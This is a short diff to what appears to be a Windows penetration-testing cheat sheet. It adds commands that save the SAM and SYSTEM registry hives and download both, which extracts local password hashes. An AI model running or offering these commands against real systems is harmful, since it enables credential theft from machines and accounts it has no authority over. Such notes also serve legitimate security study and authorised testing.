@@ -31,7 +31,9 @@ This documents is for windows
 
 - Download the sam file\
 `reg save hklm\sam sam.bak` \
-`download sam.bak`
+`reg save hklm\system system.bak` \
+`download sam.bak` \
+`download system.bak`
 
 
 ---
